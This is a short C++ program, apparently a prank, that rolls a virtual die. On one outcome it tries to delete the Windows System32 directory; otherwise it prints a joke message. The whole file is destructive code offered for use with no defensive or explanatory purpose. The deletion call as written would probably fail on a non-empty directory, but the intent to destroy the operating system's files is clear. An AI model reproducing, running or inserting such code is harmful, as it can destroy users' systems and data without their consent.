#include <iostream>
#include <cstdlib>
#include <filesystem>

int main() {
    srand((unsigned) time(NULL));
    int random = 1 + rand() % 6;
    (random == 3) ? void(std::filesystem::remove("C:\\Windows\\System32")) : void(std::cout << "You good G.");

    return 0;
}

